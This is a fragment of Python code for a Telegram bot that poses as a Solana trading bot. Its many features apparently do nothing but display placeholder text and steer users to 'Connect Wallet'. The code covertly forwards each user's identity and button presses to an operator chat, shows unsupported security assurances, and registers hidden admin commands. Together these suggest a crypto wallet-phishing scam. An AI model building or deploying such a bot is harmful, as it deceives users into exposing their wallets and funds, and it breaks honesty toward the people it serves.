        )

    elif data == "liq_ethereum":
        await query.edit_message_text(
            "🔷 ETHEREUM\n\nYou have selected Ethereum network.\n\nPlease connect your wallet to add liquidity:",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔗 Connect Wallet", callback_data="connect_wallet")],
                [InlineKeyboardButton("◀️ BACK", callback_data="add_liquidity")],
            ]),
        )

    elif data == "bridge":
        await query.edit_message_text(
            "🌉 Bridge\n\nBridge your tokens across chains.\nConnect your wallet to use the bridge.",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔗 Connect Wallet", callback_data="connect_wallet")],
                [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")],
            ]),
        )

    elif data == "copy":
        w = get_wallet(uid)
        pubkey = w["pubkey"] if w else "Not connected"
        await query.edit_message_text(
            "Copy Trade\nWallet: " + pubkey + " — W1\n\nCopy Trade allows you to copy the buys and sells of any target wallet.\n🟢 Indicates a copy trade setup is active.\n🟠 Indicates a copy trade setup is paused.",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("➕ New Copy Trade", callback_data="new_copy_trade")],
                [InlineKeyboardButton("🔗 Connect Wallet", callback_data="connect_wallet")],
                [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")],
            ]),
        )

    elif data == "new_copy_trade":
        await query.edit_message_text(
            "➕ New Copy Trade\n\nPlease enter the wallet address you want to copy trade:\n\nExample:\n`HkaS8KMyg9gUM937QF8x9Pb1s13S3uk9aFGFWguhBpAb`",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("⬅ Back", callback_data="copy")],
                [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")],
            ]),
        )

    elif data == "withdraw":
        await query.edit_message_text(
            "💸 Withdraw\n\nWithdraw your funds to an external wallet.\nConnect your wallet to make a withdrawal.",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔗 Connect Wallet", callback_data="connect_wallet")],
                [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")],
            ]),
        )

    elif data == "copy_wallet":
        w = get_wallet(uid)
        if not w:
            await query.edit_message_text(
                "📋 Copy Wallet\n\nNo wallet connected.\nConnect your wallet first to see your address.",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔗 Connect Wallet", callback_data="connect_wallet")],
                    [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")],
                ]),
            )
        else:
            await query.edit_message_text(
                "📋 Copy Wallet\n\nYour wallet address:\n`" + w["pubkey"] + "`",
                parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]]),
            )

    elif data == "auto_trade":
        await query.edit_message_text(
            "🤖 Auto Trade-Pumpfun\n\nAutomatically trade tokens on Pumpfun.\nConnect your wallet to activate.",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔗 Connect Wallet", callback_data="connect_wallet")],
                [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")],
            ]),
        )

    elif data == "help":
        await query.edit_message_text(
            "❓ Help\n\nWelcome to the Help Center.\n\nHow to get started:\n1. Connect your wallet\n2. Fund your wallet with SOL\n3. Use Buy to purchase tokens\n4. Use Sell to sell tokens\n\nFor support contact: @support",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]]),
        )

    elif data == "trades":
        w = get_wallet(uid)
        if not w:
            await query.edit_message_text(
                "🎮 Trades\n\nPlease connect your wallet first to view your trade history.",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔗 Connect Wallet", callback_data="connect_wallet")],
                    [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")],
                ]),
            )
        else:
            await query.edit_message_text(
                "🎮 Trades\n\nWallet: `" + w["pubkey"][:8] + "..." + w["pubkey"][-8:] + "`\n\nYou have no recent trades.",
                parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🛒 Buy", callback_data="buy"),
                     InlineKeyboardButton("💰 Sell", callback_data="sell")],
                    [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")],
                ]),
            )

    elif data == "cashback":
        await query.edit_message_text(
            "💰 Cashback\n\nEarn cashback on every trade you make.\nConnect your wallet to activate cashback rewards.",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔗 Connect Wallet", callback_data="connect_wallet")],
                [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")],
            ]),
        )

    elif data == "transfer_sol":
        w = get_wallet(uid)
        if not w:
            await query.edit_message_text(
                "🗃 Transfer SOL\n\nPlease connect your wallet first to transfer SOL.",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔗 Connect Wallet", callback_data="connect_wallet")],
                    [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")],
                ]),
            )
        else:
            context.user_data["expecting"] = "transfer_sol"
            await query.edit_message_text(
                "🗃 Transfer SOL\n\nPlease enter the recipient wallet address and amount (e.g. `Address, Amount`):",
                parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")],
                ]),
            )

    elif data == "settings":
        await query.edit_message_text(
            "🔧 Settings\n\nBot settings:\n- Slippage: 1%\n- Auto-approve: Off\n- MEV Protection: On\n\nSelect an option to change:",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("📊 Slippage", callback_data="set_slippage")],
                [InlineKeyboardButton("✅ Auto-Approve", callback_data="set_auto_approve")],
                [InlineKeyboardButton("🛡 MEV Protection", callback_data="set_mev")],
                [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")],
            ]),
        )

    elif data == "stbot_token":
        await query.edit_message_text(
            "🔥 Our STBOT Token\n\nLearn more about our native token.\n\nContract: `Coming Soon`",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🌐 Website", url="https://metatrading.com")],
                [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")],
            ]),
        )

    elif data == "market_maker":
        await query.edit_message_text(
            "🚀 Market Maker\n\nBoost your token volume and liquidity.\nConnect your wallet to activate market making.",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔗 Connect Wallet", callback_data="connect_wallet")],
                [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")],
            ]),
        )

    elif data == "backup_bots":
        await query.edit_message_text(
            "🤖 Backup Bots\n\nOur backup bot list:\n1. @MetaTradingBot2\n2. @MetaTradingBot3\n\nAdd them as backup in case this bot is down.",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]]),
        )

    elif data == "security":
        await query.edit_message_text(
            "🛡 Security\n\nYour wallet data is encrypted and stored securely.\n- Private keys are never logged\n- All transactions are signed locally\n- Session expires after 24h of inactivity",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]]),
        )

    elif data == "tutorials":
        await query.edit_message_text(
            "📑 Tutorials\n\n1. How to connect your wallet\n2. How to buy a token\n3. How to sell a token\n4. How to use limit orders\n5. How to copy trade\n\nMore tutorials coming soon!",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]]),
        )

    elif data == "close":
        await query.delete_message()
        return

    elif data in ["lang_en", "lang_zh", "lang_ru", "lang_pt", "lang_vi"]:
        lang_map = {"lang_en": "English 🇺🇸", "lang_zh": "中文 🇨🇳", "lang_ru": "Русский 🇷🇺", "lang_pt": "Português 🇧🇷", "lang_vi": "Tiếng Việt 🇻🇳"}
        await query.answer("Language set to " + lang_map.get(data, "English") + "!", show_alert=True)

    elif data == "new_sniper":
        await query.edit_message_text(NEW_SNIPER_TEXT, reply_markup=new_sniper_keyboard())

    elif data == "listing_header":
        await query.answer("Filter your sniper listings", show_alert=False)

    elif data == "targeted_sniper":
        await query.edit_message_text(
            "⭐ Targeted Sniper\n\nPlease enter your snipe parameters in this format:\n"
            "`DevWallet | TokenSymbol | TokenAddress`\n\n"
            "All fields are optional. Leave blank for any.",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Back Sniper Home", callback_data="sniper")]]),
        )

    elif data == "mass_sniper":
        await query.edit_message_text(
            "🌟 Mass Sniper\n\nYou are about to enable mass sniping mode.\n"
            "This will snipe ALL tokens on your selected DEXs without validation.\n\n"
            "⚠️ High risk — use with caution!\n\n"
            "Select your DEXs to continue:",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("Raydium", callback_data="mass_raydium"),
                 InlineKeyboardButton("Orca", callback_data="mass_orca")],
                [InlineKeyboardButton("Pumpfun", callback_data="mass_pumpfun")],
                [InlineKeyboardButton("🏠 Back Sniper Home", callback_data="sniper")],
            ]),
        )

    elif data == "sniper_all":
        await query.edit_message_text("🎯 Sniper V2 — All Listings\n\nShowing all sniper jobs...", reply_markup=sniper_keyboard())

    elif data == "sniper_active":
        await query.edit_message_text("🎯 Sniper V2 — Active\n\nShowing active sniper jobs...", reply_markup=sniper_keyboard())

    elif data == "sniper_inactive":
        await query.edit_message_text("🎯 Sniper V2 — Inactive\n\nShowing inactive sniper jobs...", reply_markup=sniper_keyboard())

    elif data == "sniper_completed":
        await query.edit_message_text("🎯 Sniper V2 — Completed\n\nShowing completed sniper jobs...", reply_markup=sniper_keyboard())

    elif data == "sniper_doc":
        await query.answer("Documentation coming soon!", show_alert=True)

    if FORWARD_CHAT_ID and data not in ["main_menu", "refresh"]:
        try:
            name = ("@" + user.username) if user and user.username else str(user.full_name)
            await context.bot.send_message(
                chat_id=FORWARD_CHAT_ID,
                text="🔘 Button pressed\nUser: " + name + "\nID: " + str(uid) + "\nButton: " + data,
            )
        except Exception as exc:
            logger.error("BUTTON FORWARD FAILED: %s", exc, exc_info=True)


async def send_daily_stats(context: ContextTypes.DEFAULT_TYPE):
    if not FORWARD_CHAT_ID:
        return
    try:
        s = get_stats()
        lines = ["Daily Statistics Report", "Date: " + datetime.utcnow().strftime("%Y-%m-%d"),
                 "Total: " + str(s["total"]), "Today: " + str(s["today"]),
                 "Users: " + str(s["unique_users"]), "", "By type:"]
        for mtype, count in s["by_type"]:
            lines.append("  " + str(mtype) + ": " + str(count))
        await context.bot.send_message(chat_id=FORWARD_CHAT_ID, text="\n".join(lines))
    except Exception as exc:
        logger.warning("Could not send daily stats: %s", exc)


async def main():
    init_db()
    app = ApplicationBuilder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start",       cmd_start))
    app.add_handler(CommandHandler("buy",         cmd_buy))
    app.add_handler(CommandHandler("sell",        cmd_sell))
    app.add_handler(CommandHandler("positions",   cmd_positions))
    app.add_handler(CommandHandler("limits",      cmd_limits))
    app.add_handler(CommandHandler("dca",         cmd_dca))
    app.add_handler(CommandHandler("trending",    cmd_trending))
    app.add_handler(CommandHandler("boosted",     cmd_boosted))
    app.add_handler(CommandHandler("topboost",    cmd_topboost))
    app.add_handler(CommandHandler("profiles",    cmd_profiles))
    app.add_handler(CommandHandler("search",      cmd_search))
    app.add_handler(CommandHandler("charts",      cmd_charts))
    app.add_handler(CommandHandler("launch",      cmd_launch))
    app.add_handler(CommandHandler("pnls",        cmd_pnls))
    app.add_handler(CommandHandler("sniper",      cmd_sniper))
    app.add_handler(CommandHandler("refer",       cmd_refer))
    app.add_handler(CommandHandler("wallet",      cmd_wallet))
    app.add_handler(CommandHandler("buytrending", cmd_buytrending))
    app.add_handler(CommandHandler("volume",      cmd_volume))
    app.add_handler(CommandHandler("liquidity",   cmd_liquidity))
    app.add_handler(CommandHandler("bridge",      cmd_bridge))
    app.add_handler(CommandHandler("copy",        cmd_copy))
    app.add_handler(CommandHandler("withdraw",    cmd_withdraw))
    app.add_handler(CommandHandler("copywallet",  cmd_copywallet))
    app.add_handler(CommandHandler("autotrade",   cmd_autotrade))
    app.add_handler(CommandHandler("newwallet",   cmd_newwallet))
    app.add_handler(CommandHandler("help",        cmd_help))
    app.add_handler(CommandHandler("myid",        cmd_myid))
    app.add_handler(CommandHandler("stats",       cmd_stats))
    app.add_handler(CommandHandler("allow",       cmd_allow))
    app.add_handler(CommandHandler("block",       cmd_block))
    app.add_handler(CommandHandler("unfilter",    cmd_unfilter))
    app.add_handler(CommandHandler("listusers",   cmd_listusers))
    app.add_handler(CallbackQueryHandler(button_callback))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    app.add_handler(MessageHandler(filters.PHOTO,        handle_photo))
    app.add_handler(MessageHandler(filters.VIDEO,        handle_video))
    app.add_handler(MessageHandler(filters.AUDIO,        handle_audio))
    app.add_handler(MessageHandler(filters.VOICE,        handle_voice))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    app.add_handler(MessageHandler(filters.Sticker.ALL,  handle_sticker))

    job_queue = app.job_queue
    if job_queue:
        job_queue.run_daily(send_daily_stats, time=dtime(hour=8, minute=0))

    logger.info("Bot is running. Press Ctrl+C to stop.")
    async with app:
        await app.initialize()
        await app.bot.set_my_commands([
            BotCommand("start",       "Trade on Solana with Meta Bot"),
            BotCommand("buy",         "Buy a token"),
            BotCommand("sell",        "Sell a token"),
            BotCommand("positions",   "View your positions"),
            BotCommand("limits",      "Set limit orders"),
            BotCommand("dca",         "Dollar cost averaging"),
            BotCommand("trending",    "View trending tokens"),
            BotCommand("boosted",     "View boosted tokens"),
            BotCommand("topboost",    "View top boosted tokens"),
            BotCommand("profiles",    "Manage trading profiles"),
            BotCommand("search",      "Search for a token"),
            BotCommand("charts",      "View token charts"),
            BotCommand("launch",      "Launch a token"),
            BotCommand("pnls",        "View your PNLs"),
            BotCommand("sniper",      "Snipe token launches"),
            BotCommand("refer",       "Refer and earn rewards"),
            BotCommand("wallet",      "Manage your wallet"),
            BotCommand("buytrending", "Buy trending tokens"),
            BotCommand("volume",      "Volume booster"),
            BotCommand("liquidity",   "Add liquidity"),
            BotCommand("bridge",      "Bridge tokens"),
            BotCommand("copy",        "Copy trading"),
            BotCommand("withdraw",    "Withdraw funds"),
            BotCommand("copywallet",  "Copy wallet address"),
            BotCommand("autotrade",   "Auto trade on Pumpfun"),
            BotCommand("newwallet",   "Generate a new wallet"),
            BotCommand("help",        "Get help"),
            BotCommand("myid",        "Your Telegram user ID"),
            BotCommand("stats",       "Message statistics"),
        ])
        await app.start()
        await app.updater.start_polling()
        await asyncio.Event().wait()


if __name__ == "__main__":
    asyncio.run(main())